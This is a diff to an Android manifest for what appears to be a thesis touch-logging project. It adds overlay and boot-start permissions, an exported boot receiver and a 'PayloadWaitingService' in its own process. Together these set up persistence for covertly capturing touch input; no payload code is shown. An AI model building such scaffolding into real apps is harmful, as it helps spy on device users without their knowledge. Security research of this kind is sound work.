@@ -3,6 +3,8 @@
           package="org.leyfer.thesis.touchlogger_dirty">
 
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
 
     <application
         android:allowBackup="true"
@@ -21,6 +23,20 @@
             </intent-filter>
         </activity>
 
+        <receiver
+            android:name=".receiver.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name=".service.PayloadWaitingService"
+            android:exported="false"
+            android:process="touchlogger.here">
+        </service>
     </application>
 
 </manifest>
